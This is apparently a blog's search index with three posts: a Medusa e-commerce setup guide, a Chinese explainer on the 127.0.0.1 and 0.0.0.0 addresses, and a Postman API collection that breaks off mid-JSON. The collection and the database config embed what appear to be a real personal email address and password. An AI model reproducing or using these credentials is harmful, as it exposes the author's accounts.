<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>1.medusajs quick start</title>
    <url>/2022/04/18/1.Medusajs%20quick%20start/</url>
    <content><![CDATA[<h2 id="in-Ubuntu-medusa-version-v1-7-12"><a href="#in-Ubuntu-medusa-version-v1-7-12" class="headerlink" title="in Ubuntu / medusa version v1.7.12"></a>in Ubuntu / medusa version <a href="https://github.com/medusajs/medusa/releases/tag/v1.7.12">v1.7.12</a></h2><p>nodejs version</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  ~ node -v</span><br><span class="line">v16.14.1</span><br><span class="line">➜  ~ npm -v</span><br><span class="line">8.5.0</span><br></pre></td></tr></table></figure>

<h3 id="Quickstart"><a href="#Quickstart" class="headerlink" title="Quickstart"></a>Quickstart</h3><ol>
<li><p>Install Medusa CLI</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install -g @medusajs&#x2F;medusa-cli</span><br></pre></td></tr></table></figure>
</li>
<li><p>Create a new Medusa project</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">medusa new my-medusa-store --seed</span><br></pre></td></tr></table></figure>
</li>
<li><p>Start redis (in ubuntu)</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo systemctl restart redis-server</span><br><span class="line">➜  ~ redis-cli</span><br><span class="line">127.0.0.1:6379&gt; select</span><br><span class="line">(error) ERR wrong number of arguments for &#x27;select&#x27; command</span><br><span class="line">127.0.0.1:6379&gt; select 1</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379[1]&gt; FLUSHDB</span><br><span class="line">OK</span><br></pre></td></tr></table></figure>
</li>
<li><p>Start postgres DB (in ubuntu)</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  ~ sudo /etc/init.d/postgresql start</span><br><span class="line">[sudo] password for zhuang: </span><br><span class="line">➜  ~ </span><br><span class="line">➜  ~ sudo -i -u postgres</span><br><span class="line">postgres@elementoryos61:~$ psql</span><br><span class="line">psql (12.9 (Ubuntu 12.9-0ubuntu0.20.04.1))</span><br><span class="line">Type &quot;help&quot; for help.</span><br><span class="line">postgres=# CREATE DATABASE openharbor_marketplace_medusa;</span><br><span class="line">CREATE DATABASE</span><br><span class="line">postgres=# </span><br></pre></td></tr></table></figure>
</li>
<li><p>Config postgress</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">// CORS when consuming Medusa from admin</span><br><span class="line">const ADMIN_CORS = process.env.ADMIN_CORS || &quot;http://localhost:7000,http://localhost:7001&quot;;</span><br><span class="line"></span><br><span class="line">// CORS to avoid issues when consuming Medusa from a client</span><br><span class="line">const STORE_CORS = process.env.STORE_CORS || &quot;http://localhost:8000&quot;;</span><br><span class="line"></span><br><span class="line">// Database URL (here we use a local database called medusa-development)</span><br><span class="line">const DATABASE_URL =</span><br><span class="line">  process.env.DATABASE_URL || &quot;postgres://postgres:postgres@localhost:5432/openharbor_marketplace_medusa&quot;;</span><br><span class="line"></span><br><span class="line">// Medusa uses Redis, so this needs configuration as well</span><br><span class="line">const REDIS_URL = process.env.REDIS_URL || &quot;redis://localhost:6379&quot;;</span><br><span class="line"></span><br><span class="line">// This is the place to include plugins. See API documentation for a thorough guide on plugins.</span><br><span class="line">const plugins = [</span><br><span class="line">  `medusa-fulfillment-manual`,</span><br><span class="line">  `medusa-payment-manual`,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">module.exports = &#123;</span><br><span class="line">  projectConfig: &#123;</span><br><span class="line">    redis_url: REDIS_URL,</span><br><span class="line">    // For more production-like environment install PostgresQL</span><br><span class="line">    database_url: DATABASE_URL,</span><br><span class="line">    database_type: &quot;postgres&quot;,</span><br><span class="line">    // database_database: &quot;./medusa-db.sql&quot;,</span><br><span class="line">    //database_type: &quot;sqlite&quot;,</span><br><span class="line">    store_cors: STORE_CORS,</span><br><span class="line">    admin_cors: ADMIN_CORS,</span><br><span class="line">  &#125;,</span><br><span class="line">  plugins,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
</li>
<li><p>Init data for postgres DB</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">medusa migrations run</span><br></pre></td></tr></table></figure>
</li>
<li><p>Start your Medusa engine</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">medusa develop</span><br></pre></td></tr></table></figure>
</li>
<li><p>Use the API, check medusa server status.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl localhost:9000/store/products</span><br></pre></td></tr></table></figure>



</li>
</ol>
<h3 id="Setting-up-Admin"><a href="#Setting-up-Admin" class="headerlink" title="Setting up Admin"></a>Setting up Admin</h3><ol>
<li><p>Clone this repository</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/medusajs/admin medusa-admin</span><br><span class="line">cd medusa-admin</span><br></pre></td></tr></table></figure>
</li>
<li><p>Install dependencies</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yarn install</span><br></pre></td></tr></table></figure>
</li>
<li><p>Start the development server</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yarn start</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>Go to <a href="http://localhost:7000/">http://localhost:7000</a></strong></p>
</li>
<li><p>Back in your Medusa engine installation directory, you can create your own user for the admin by running:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">medusa user -e some@email.com -p some-password</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h2 id="Setup-medusa-plugin-filestorage-local"><a href="#Setup-medusa-plugin-filestorage-local" class="headerlink" title="Setup medusa-plugin-filestorage-local"></a>Setup <strong><a href="https://github.com/Blechlawine/medusa-plugin-filestorage-local">medusa-plugin-filestorage-local</a></strong></h2><p>setup medusa local file service for Images of product which support you create product in Admin.</p>
<ol>
<li><p>Back in your Medusa engine installation directory,</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install medusa-plugin-filestorage-local</span><br></pre></td></tr></table></figure>
</li>
<li><p>Setup config in medusa-config.js</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> plugins = [</span><br><span class="line">  <span class="string">`medusa-fulfillment-manual`</span>,</span><br><span class="line">  <span class="string">`medusa-payment-manual`</span>,</span><br><span class="line">  &#123;</span><br><span class="line">  	resolve: <span class="string">`medusa-plugin-filestorage-local`</span>,</span><br><span class="line">  	options: &#123;</span><br><span class="line"> 	   <span class="comment">// The baseurl for your medusajs server</span></span><br><span class="line">    	   serverBaseUrl: <span class="string">&quot;http://localhost:9000&quot;</span>,</span><br><span class="line">    	   <span class="comment">// when enabled saves the file as a base64 encoded string inside the database (deleting that row is not yet supported)</span></span><br><span class="line">    	   saveInDatabase: <span class="literal">false</span>, <span class="comment">// recommended: false</span></span><br><span class="line">    	   <span class="comment">// the folder where your files are stored on the server</span></span><br><span class="line">    	   fileLocation: <span class="string">&quot;uploads/persistent/&quot;</span>,</span><br><span class="line">    	&#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">];</span><br></pre></td></tr></table></figure>
</li>
<li><p>Restart medusa server</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">medusa develop</span><br><span class="line">// or</span><br><span class="line">medusa start</span><br></pre></td></tr></table></figure>
</li>
<li><p>then, you can create a product in medusa admin. e.g. <a href="http://localhost:7000/">http://localhost:7000/</a></p>
</li>
</ol>
<p>====================================================================</p>
<h2 id="in-Mac-medusa-version-v1-10-1"><a href="#in-Mac-medusa-version-v1-10-1" class="headerlink" title="in Mac / medusa version v1.10.1"></a>in Mac / medusa version <a href="https://github.com/medusajs/medusa/releases/tag/v1.10.1">v1.10.1</a></h2><p>Follow the medusa guide <a href="https://docs.medusajs.com/development/backend/prepare-environment">https://docs.medusajs.com/development/backend/prepare-environment</a></p>
<ol>
<li>node version</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  ~ node -v   </span><br><span class="line">v18.16.0</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>Install medusa CLI</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install @medusajs/medusa-cli -g</span><br><span class="line"></span><br><span class="line">➜  ~ medusa -v                           </span><br><span class="line">Medusa CLI version: 1.3.13</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>Create a new Medusa project</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">medusa new my-medusa-store --seed</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>Start your Medusa backend</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd my-medusa-store</span><br><span class="line">medusa develop</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>Test the Backend</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl localhost:9000/store/products</span><br></pre></td></tr></table></figure>

<ol start="6">
<li>PostgreSQL Configurations</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">const DATABASE_TYPE = process.env.DATABASE_TYPE || &quot;postgres&quot;;</span><br><span class="line">const DATABASE_URL = process.env.DATABASE_URL || &quot;postgres://postgres:zaq12wsx@localhost:5432/pg-medusa-1-10-1-test&quot;;</span><br></pre></td></tr></table></figure>

<ol start="7">
<li>Update DB</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">medusa migrations run</span><br></pre></td></tr></table></figure>

<ol start="8">
<li>medusa can mock Redis for test</li>
</ol>
<h3 id="For-admin-dashboard"><a href="#For-admin-dashboard" class="headerlink" title="For admin dashboard"></a>For admin dashboard</h3><ol>
<li>back the folder path of medusa, Install the Package of Admin Dashboard</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install @medusajs/admin</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>Add Admin to Medusa Configurations.</li>
</ol>
<p>In <code>medusa-config.js</code>, add the admin plugin into the array of <code>plugins</code>:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> plugins = [</span><br><span class="line">  <span class="string">`medusa-fulfillment-manual`</span>,</span><br><span class="line">  <span class="string">`medusa-payment-manual`</span>,</span><br><span class="line">  <span class="comment">// To enable the admin plugin, uncomment the following lines and run `yarn add @medusajs/admin`</span></span><br><span class="line">   &#123;</span><br><span class="line">     resolve: <span class="string">&quot;@medusajs/admin&quot;</span>,</span><br><span class="line">     <span class="comment">/** <span class="doctag">@type <span class="type">&#123;import(&#x27;@medusajs/admin&#x27;).PluginOptions&#125;</span> </span>*/</span></span><br><span class="line">     options: &#123;</span><br><span class="line">       autoRebuild: <span class="literal">true</span>,</span><br><span class="line">     &#125;,</span><br><span class="line">   &#125;,</span><br><span class="line">];</span><br></pre></td></tr></table></figure>

<p>The plugin accepts the following options:</p>
<p>a. <code>serve</code>: (default: <code>true</code>) a boolean indicating whether to serve the admin dashboard when the Medusa backend starts. If set to <code>false</code>, you can serve the admin dashboard using the <a href="https://docs.medusajs.com/admin/quickstart#dev-command-options">dev command</a>.</p>
<p>b. <code>path</code>: (default: <code>app</code>) a string indicating the path the admin server should run on. It shouldn’t be prefixed or suffixed with a slash <code>/</code>, and it can’t be one of the reserved paths: “admin” and “store”.</p>
<p>c. <code>outDir</code>: Optional path for where to output the admin build files.</p>
<p>e. <code>autoRebuild</code>: (default: <code>false</code>) a boolean indicating whether the admin UI should be rebuilt if there are any changes or if a missing build is detected when the backend starts. If not set, you must <a href="https://docs.medusajs.com/admin/quickstart#build-command-options">manually build the admin dashboard</a>.</p>
<ol start="3">
<li>Start the Admin Dashboard</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm run start</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>Create a New Admin User</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">medusa user -e some@email.com -p some-password</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>eCommerce</tag>
      </tags>
  </entry>
  <entry>
    <title>127.0.0.1和0.0.0.0地址</title>
    <url>/2020/03/15/127.0.0.1%E5%92%8C0.0.0.0%E5%9C%B0%E5%9D%80/</url>
    <content><![CDATA[<h3 id="IP地址介绍"><a href="#IP地址介绍" class="headerlink" title="IP地址介绍"></a>IP地址介绍</h3><p>IP地址由两个部分组成，net-id和host-id，即网络号和主机号。<br>net-id：表示ip地址所在的网络号。<br>host-id：表示ip地址所在网络中的某个主机号码。</p>
<p>即：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">IP-address ::=  &#123; &lt;Network-number&gt;, &lt;Host-number&gt; &#125;</span><br></pre></td></tr></table></figure>

<h3 id="IP地址分类"><a href="#IP地址分类" class="headerlink" title="IP地址分类"></a>IP地址分类</h3><p>IP地址一共分为5类，即A～E，它们分类的依据是其net-id所占的字节长度以及网络号前几位。</p>
<ul>
<li><p>A类地址:网络号占1个字节。</p>
<p>网络号的第一位固定为0。</p>
</li>
<li><p>B类地址：</p>
<p>网络号占2个字节。</p>
<p>网络号的前两位固定为10。</p>
</li>
<li><p>C类地址：</p>
<p>网络号占3个字节。</p>
<p>网络号的前三位固定位110。</p>
</li>
<li><p>D类地址：</p>
<p>前四位是1110，用于多播(multicast)，即一对多通信。</p>
</li>
<li><p>E类地址：</p>
<p>前四位是1111，保留为以后使用。</p>
</li>
</ul>
<p>其中，ABC三类地址为单播地址（unicast)，用于一对一通信，是最常用的。</p>
<h3 id="特殊IP地址"><a href="#特殊IP地址" class="headerlink" title="特殊IP地址"></a>特殊IP地址</h3><p>就是用来做一些特殊的事情。RFC1700中定义了以下特殊IP地址。</p>
<ol>
<li>{0,0}：网络号和主机号都全部为0，表示“本网络上的本主机”，只能用作源地址。</li>
<li>{0，host-id}：本网络上的某台主机。只能用作源地址。</li>
<li>{-1,-1}：表示网络号和主机号的所有位上都是1（二进制），用于本网络上的广播，只能用作目的地址，发到该地址的数据包不能转发到源地址所在网络之外。</li>
<li>{net-id,-1}：直接广播到指定的网络上。只能用作目的地址。</li>
<li>{net-id,subnet-id,-1}：直接广播到指定网络的指定子网络上。只用作目的地址。</li>
<li>{net-id,-1,-1}：直接广播到指定网络的所有子网络上。只能用作目的地址。</li>
<li>{127，}：即网络号为127的任意ip地址。都是内部主机回环地址(loopback)，永远都不能出现在主机外部的网络中。</li>
</ol>
<h3 id="127-0-0-1和0-0-0-0地址的区别是什么？"><a href="#127-0-0-1和0-0-0-0地址的区别是什么？" class="headerlink" title="127.0.0.1和0.0.0.0地址的区别是什么？"></a>127.0.0.1和0.0.0.0地址的区别是什么？</h3><p>我们先来看下共同点：</p>
<ol>
<li>都属于特殊地址。</li>
<li>都属于A类地址。</li>
<li>都是IPV4地址。</li>
</ol>
<h4 id="0-0-0-0"><a href="#0-0-0-0" class="headerlink" title="0.0.0.0"></a>0.0.0.0</h4><p>IPV4中，0.0.0.0地址被用于表示一个无效的，未知的或者不可用的目标。</p>
<ul>
<li>在服务器中，0.0.0.0指的是本机上的所有IPV4地址，如果一个主机有两个IP地址，192.168.1.1 和 10.1.2.1，并且该主机上的一个服务监听的地址是0.0.0.0，那么通过两个ip地址都能够访问该服务。</li>
<li>在路由中，0.0.0.0表示的是默认路由，即当路由表中没有找到完全匹配的路由的时候所对应的路由。</li>
</ul>
<h4 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h4><ul>
<li>当一台主机还没有被分配一个IP地址的时候，用于表示主机本身。（DHCP分配IP地址的时候）</li>
<li>用作默认路由，表示”任意IPV4主机”。用来表示目标机器不可用。</li>
<li>用作服务端，表示本机上的任意IPV4地址。</li>
</ul>
<h4 id="127-0-0-1"><a href="#127-0-0-1" class="headerlink" title="127.0.0.1"></a>127.0.0.1</h4><p>127.0.0.1属于{127,}集合中的一个，而所有网络号为127的地址都被称之为回环地址，它们是包含关系，即回环地址包含127.0.0.1。<br>回环地址：所有发往该类地址的数据包都应该被loop back。</p>
<h4 id="用途-1"><a href="#用途-1" class="headerlink" title="用途"></a>用途</h4><ul>
<li>回环测试,通过使用ping 127.0.0.1 测试某台机器上的网络设备，操作系统或者TCP/IP实现是否工作正常。</li>
<li>DDos攻击防御：网站收到DDos攻击之后，将域名A记录到127.0.0.1，即让攻击者自己攻击自己。</li>
<li>大部分Web容器测试的时候绑定的本机地址。</li>
</ul>
<h4 id="localhost"><a href="#localhost" class="headerlink" title="localhost"></a>localhost</h4><p>相比127.0.0.1，localhost具有更多的意义。localhost是个域名，而不是一个ip地址。之所以我们经常把localhost与127.0.0.1认为是同一个是因为我们使用的大多数电脑上都讲localhost指向了127.0.0.1这个地址。<br>在ubuntu系统中，/ets/hosts文件中都会有如下内容：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">127.0.0.1   localhost</span><br><span class="line">127.0.1.1   jason-Lenovo-V3000</span><br><span class="line"><span class="meta">#</span><span class="bash"> The following lines are desirable <span class="keyword">for</span> IPv6 capable hosts</span></span><br><span class="line">::1     ip6-localhost ip6-loopback</span><br><span class="line">fe00::0 ip6-localnet</span><br><span class="line">ff00::0 ip6-mcastprefix</span><br><span class="line">ff02::1 ip6-allnodes</span><br><span class="line">ff02::2 ip6-allrouters</span><br></pre></td></tr></table></figure>

<p>上面第一行是几乎每台电脑上都会有的默认配置。<br>但是localhost的意义并不局限于127.0.0.1。</p>
<p>localhost是一个域名，用于指代this computer或者this host,可以用它来获取运行在本机上的网络服务。<br>在大多数系统中，localhost被指向了IPV4的127.0.0.1和IPV6的::1。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">127.0.0.1    localhost</span><br><span class="line">::1          localhost</span><br></pre></td></tr></table></figure>

<p>所以，在使用的时候要注意确认IPV4还是IPV6</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>127.0.0.1 是一个环回地址。并不表示“本机”。0.0.0.0才是真正表示“本网络中的本机”。<br>在实际应用中，一般我们在服务端绑定端口的时候可以选择绑定到0.0.0.0，这样我的服务访问方就可以通过我的多个ip地址访问我的服务。</p>
<p>比如我有一台服务器，一个外网地址A,一个内网地址B，如果我绑定的端口指定了0.0.0.0，那么通过内网地址或外网地址都可以访问我的应用。但是如果我只绑定了内网地址，那么通过外网地址就不能访问。所以如果绑定0.0.0.0，也有一定安全隐患，对于只需要内网访问的服务，可以只绑定内网地址。</p>
]]></content>
      <tags>
        <tag>服务器地址</tag>
      </tags>
  </entry>
  <entry>
    <title>3.Create medusa transaction step by step</title>
    <url>/2022/04/26/3.Create%20medusa%20transaction%20step%20by%20step/</url>
    <content><![CDATA[<p>This is a collection of medusa-postman, from the name sequence, we can see the business steps one by one.</p>
<p>It is based on <a href="https://github.com/medusajs/medusa/releases/tag/%40medusajs%2Fmedusa%401.2.1">@medusajs/medusa@1.2.1</a>, <a href="https://github.com/medusajs/medusa/releases/tag/%40medusajs%2Fmedusa-cli%401.2.1">@medusajs/medusa-cli@1.2.1</a>.</p>
<p>Please import this json as a file into postman, you can call the API step by step.</p>
<p>![](3.Create medusa transaction step by step/1.png)</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="attr">&quot;info&quot;</span>: &#123;</span><br><span class="line">		<span class="attr">&quot;_postman_id&quot;</span>: <span class="string">&quot;d0447766-3c8d-4b70-bf6c-ca66061249f8&quot;</span>,</span><br><span class="line">		<span class="attr">&quot;name&quot;</span>: <span class="string">&quot;medusa&quot;</span>,</span><br><span class="line">		<span class="attr">&quot;schema&quot;</span>: <span class="string">&quot;https://schema.getpostman.com/json/collection/v2.1.0/collection.json&quot;</span></span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="attr">&quot;item&quot;</span>: [</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="attr">&quot;name&quot;</span>: <span class="string">&quot;1.Authenticate a User&quot;</span>,</span><br><span class="line">			<span class="attr">&quot;request&quot;</span>: &#123;</span><br><span class="line">				<span class="attr">&quot;method&quot;</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">				<span class="attr">&quot;header&quot;</span>: [],</span><br><span class="line">				<span class="attr">&quot;body&quot;</span>: &#123;</span><br><span class="line">					<span class="attr">&quot;mode&quot;</span>: <span class="string">&quot;raw&quot;</span>,</span><br><span class="line">					<span class="attr">&quot;raw&quot;</span>: <span class="string">&quot;&#123;\n  \&quot;email\&quot;: \&quot;zwm136200@gmail.com\&quot;,\n  \&quot;password\&quot;: \&quot;zaq12wsx\&quot;\n&#125;\n&quot;</span>,</span><br><span class="line">					<span class="attr">&quot;options&quot;</span>: &#123;</span><br><span class="line">						<span class="attr">&quot;raw&quot;</span>: &#123;</span><br><span class="line">							<span class="attr">&quot;language&quot;</span>: <span class="string">&quot;json&quot;</span></span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;,</span><br><span class="line">				<span class="attr">&quot;url&quot;</span>: &#123;</span><br><span class="line">					<span class="attr">&quot;raw&quot;</span>: <span class="string">&quot;localhost:9000/admin/auth&quot;</span>,</span><br><span class="line">					<span class="attr">&quot;host&quot;</span>: [</span><br><span class="line">						<span class="string">&quot;localhost&quot;</span></span><br><span class="line">					],</span><br><span class="line">					<span class="attr">&quot;port&quot;</span>: <span class="string">&quot;9000&quot;</span>,</span><br><span class="line">					<span class="attr">&quot;path&quot;</span>: [</span><br><span class="line">						<span class="string">&quot;admin&quot;</span>,</span><br><span class="line">						<span class="string">&quot;auth&quot;</span></span><br><span class="line">					]</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;,</span><br><span class="line">			<span class="attr">&quot;response&quot;</span>: []</span><br><span class="line">		&#125;,</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="attr">&quot;name&quot;</span>: <span class="string">&quot;2.Create product&quot;</span>,</span><br><span class="line">			<span class="attr">&quot;request&quot;</span>: &#123;</span><br><span class="line">				<span class="attr">&quot;method&quot;</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">				<span class="attr">&quot;header&quot;</span>: [],</span><br><span class="line">				<span class="attr">&quot;body&quot;</span>: &#123;</span><br><span class="line">					<span class="attr">&quot;mode&quot;</span>: <span class="string">&quot;raw&quot;</span>,</span><br><span class="line">					<span class="attr">&quot;raw&quot;</span>: <span class="string">&quot;&#123;\n\t\&quot;title\&quot;: \&quot;nft-04-26-test-01\&quot;,\n\t\&quot;subtitle\&quot;: \&quot;\&quot;,\n\t\&quot;description\&quot;: \&quot;this is a test\&quot;,\n\t\&quot;is_giftcard\&quot;: false,\n\t\&quot;discountable\&quot;: false,\n\t\&quot;images\&quot;: [],\n\t\&quot;thumbnail\&quot;: \&quot;\&quot;,\n\t\&quot;handle\&quot;: \&quot;test-nft-product-04-27\&quot;,\n\t\&quot;weight\&quot;: 10,\n\t\&quot;length\&quot;: 20,\n\t\&quot;height\&quot;: 5,\n\t\&quot;width\&quot;: 10,\n\t\&quot;origin_country\&quot;: \&quot;\&quot;,\n\t\&quot;mid_code\&quot;: \&quot;\&quot;,\n\t\&quot;material\&quot;: \&quot;\&quot;\n&#125;&quot;</span>,</span><br><span class="line">					<span class="attr">&quot;options&quot;</span>: &#123;</span><br><span class="line">						<span class="attr">&quot;raw&quot;</span>: &#123;</span><br><span class="line">							<span class="attr">&quot;language&quot;</span>: <span class="string">&quot;json&quot;</span></span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;,</span><br><span class="line">				<span class="attr">&quot;url&quot;</span>: &#123;</span><br><span class="line">					<span class="attr">&quot;raw&quot;</span>: <span class="string">&quot;localhost:9000/admin/products&quot;</span>,</span><br><span class="line">					<span class="attr">&quot;host&quot;</span>: [</span><br><span class="line">						<span class="string">&quot;localhost&quot;</span></span><br><span class="line">					],</span><br><span class="line">					<span class="attr">&quot;port&quot;</span>: <span class="string">&quot;9000&quot;</span>,</span><br><span class="line">					<span class="attr">&quot;path&quot;</span>: [</span><br><span class="line">						<span class="string">&quot;admin&quot;</span>,</span><br><span class="line">						<span class="string">&quot;products&quot;</span></span><br><span class="line">					]</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;,</span><br><span class="line">			<span class="attr">&quot;response&quot;</span>: []</span><br><span class="line">		&#125;,</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="attr">&quot;name&quot;</span>: <span class="string">&quot;3.Create a Customer-admin&quot;</span>,</span><br><span class="line">			<span class="attr">&quot;request&quot;</span>: &#123;</span><br><span class="line">				<span class="attr">&quot;method&quot;</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">				<span class="attr">&quot;header&quot;</span>: [],</span><br><span class="line">				<span class="attr">&quot;body&quot;</span>: &#123;</span><br><span class="line">					<span class="attr">&quot;mode&quot;</span>: <span class="string">&quot;raw&quot;</span>,</span><br><span class="line">					<span class="attr">&quot;raw&quot;</span>: <span class="string">&quot;&#123;\n  \&quot;email\&quot;: \&quot;test1@gmail.com\&quot;,\n  \&quot;password\&quot;: \&quot;test1\&quot;,\n  \&quot;first_name\&quot;: \&quot;firstname\&quot;,\n  \&quot;last_name\&quot;: \&quot;lastname\&quot;\n&#125;&quot;</span>,</span><br><span class="line">					<span class="attr">&quot;options&quot;</span>: &#123;</span><br><span class="line">						<span class="attr">&quot;raw&quot;</span>: &#123;</span><br><span class="line">							<span class="attr">&quot;language&quot;</span>: <span class="string">&quot;json&quot;</span></span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;,</span><br><span class="line">				<span class="attr">&quot;url&quot;</span>: &#123;</span><br><span class="line">					<span class="attr">&quot;raw&quot;</span>: <span class="string">&quot;localhost:9000/admin/customers&quot;</span>,</span><br><span class="line">					<span class="attr">&quot;host&quot;</span>: [</span><br><span class="line">						<span class="string">&quot;localhost&quot;</span></span><br><span class="line">					],</span><br><span class="line">					<span class="attr">&quot;port&quot;</span>: <span class="string">&quot;9000&quot;</span>,</span><br><span class="line">					<span class="attr">&quot;path&quot;</span>: [</span><br><span class="line">						<span class="string">&quot;admin&quot;</span>,</span><br><span class="line">						<span class="string">&quot;customers&quot;</span></span><br><span class="line">					]</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;,</span><br><span class="line">			<span class="attr">&quot;response&quot;</span>: []</span><br><span class="line">		&#125;,</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="attr">&quot;name&quot;</span>: <span class="string">&quot;3.Create a Customer-store&quot;</span>,</span><br><span class="line">			<span class="attr">&quot;request&quot;</span>: &#123;</span><br><span class="line">				<span class="attr">&quot;method&quot;</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">				<span class="attr">&quot;header&quot;</span>: [],</span><br><span class="line">				<span class="attr">&quot;body&quot;</span>: &#123;</span><br><span class="line">					<span class="attr">&quot;mode&quot;</span>: <span class="string">&quot;raw&quot;</span>,</span><br><span class="line">					<span class="attr">&quot;raw&quot;</span>: <span class="string">&quot;&#123;\n  \&quot;email\&quot;: \&quot;test2@gmail.com\&quot;,\n  \&quot;password\&quot;: \&quot;test2\&quot;,\n  \&quot;first_name\&quot;: \&quot;firstname2\&quot;,\n  \&quot;last_name\&quot;: \&quot;lastname2\&quot;\n&#125;&quot;</span>,</span><br><span class="line">					<span class="attr">&quot;options&quot;</span>: &#123;</span><br><span class="line">						<span class="attr">&quot;raw&quot;</span>: &#123;</span><br><span class="line">							<span class="attr">&quot;language&quot;</span>: <span class="string">&quot;json&quot;</span></span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;,</span><br><span class="line">				<span class="attr">&quot;url&quot;</span>: &#123;</span><br><span class="line">					<span class="attr">&quot;raw&quot;</span>: <span class="string">&quot;localhost:9000/store/customers&quot;</span>,</span><br><span class="line">					<span class="attr">&quot;host&quot;</span>: [</span><br><span class="line">						<span class="string">&quot;localhost&quot;</span></span><br><span class="line">					],</span><br><span class="line">					<span class="attr">&quot;port&quot;</span>: <span class="string">&quot;9000&quot;</span>,</span><br><span class="line">					<span class="attr">&quot;path&quot;</span>: [</span><br><span class="line">						<span class="string">&quot;store&quot;</span>,</span><br><span class="line">						<span class="string">&quot;customers&quot;</span></span><br><span class="line">					]</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;,</span><br><span class="line">			<span class="attr">&quot;response&quot;</span>: []</span><br><span class="line">		&#125;,</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="attr">&quot;name&quot;</span>: <span class="string">&quot;4.Auth a customer&quot;</span>,</span><br><span class="line">			<span class="attr">&quot;request&quot;</span>: &#123;</span><br><span class="line">				<span class="attr">&quot;method&quot;</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">				<span class="attr">&quot;header&quot;</span>: [],</span><br><span class="line">				<span class="attr">&quot;body&quot;</span>: &#123;</span><br><span class="line">					<span class="attr">&quot;mode&quot;</span>: <span class="string">&quot;raw&quot;</span>,</span><br><span class="line">					<span class="attr">&quot;raw&quot;</span>: <span class="string">&quot;&#123;\n  \&quot;email\&quot;: \&quot;test1@gmail.com\&quot;,\n  \&quot;password\&quot;: \&quot;test1\&quot;\n&#125;&quot;</span>,</span><br><span class="line">					<span class="attr">&quot;options&quot;</span>: &#123;</span><br><span class="line">						<span class="attr">&quot;raw&quot;</span>: &#123;</span><br><span class="line">							<span class="attr">&quot;language&quot;</span>: <span class="string">&quot;json&quot;</span></span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;,</span><br><span class="line">				<span class="attr">&quot;url&quot;</span>: &#123;</span><br><span class="line">					<span class="attr">&quot;raw&quot;</span>: <span class="string">&quot;localhost:9000/store/auth&quot;</span>,</span><br><span class="line">					<span class="attr">&quot;host&quot;</span>: 